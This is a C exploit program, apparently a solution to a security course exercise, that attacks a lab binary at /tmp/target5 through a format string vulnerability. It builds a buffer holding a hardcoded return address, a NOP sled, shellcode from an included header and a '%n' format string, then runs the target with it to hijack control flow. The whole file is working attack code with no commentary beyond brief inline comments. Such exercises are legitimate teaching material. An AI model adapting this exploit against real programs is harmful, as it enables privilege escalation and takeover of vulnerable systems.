#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"
#define BSIZE 480
#define NOP 0x90
#define EIP_ADDR 0xbffffc9d
#define FMT_STR "%u%u%12582442u%n"

int main(void)
{
  char *args[3];
  char *buff;
  char *env[1];
  int bsize = BSIZE;
  int i;
  long *addr_ptr, addr;

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
 
  // 4 bytes for saved eip addr
  *(unsigned long *)buff = EIP_ADDR;
  // filled with NOP
  memset(buff+4, NOP, bsize-4);
  // filled the shell code in the middle
   memcpy(buff+bsize-strlen(FMT_STR)-sizeof(shellcode), shellcode, strlen(shellcode));
  // filled with format string
  memcpy(buff+bsize-sizeof(FMT_STR), FMT_STR, strlen(FMT_STR));
  buff[bsize - 1] = '\0';

  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
